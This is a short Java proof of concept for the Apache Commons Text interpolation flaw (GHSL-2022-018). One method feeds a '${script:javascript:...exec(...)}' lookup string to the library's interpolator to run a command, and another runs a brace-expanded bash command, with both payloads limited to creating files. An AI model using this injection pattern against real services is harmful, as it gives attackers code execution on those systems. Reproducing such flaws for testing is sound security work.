import java.io.IOException;

import org.apache.commons.text.StringSubstitutor;

public class Main {

    /**
     * @see https://securitylab.github.com/advisories/GHSL-2022-018_Apache_Commons_Text/
     */
    public Main test1() {
        final StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        String out = interpolator.replace("${script:javascript:java.lang.Runtime.getRuntime().exec('touch ./target/foo')}");
        System.out.println("test1: " + out);
        return this;
    }

    public Main test2() {
        try {
            Runtime rt = Runtime.getRuntime();
            rt.exec("/bin/bash -c {touch,./target/bar}|{/bin/bash,-i}");
            System.out.println("test2");
        }
        catch(IOException ioe) {
            ioe.printStackTrace();
        }
        return this;
    }

    public static void main(String... args) throws IOException {
        new Main().test1().test2();
    }
}
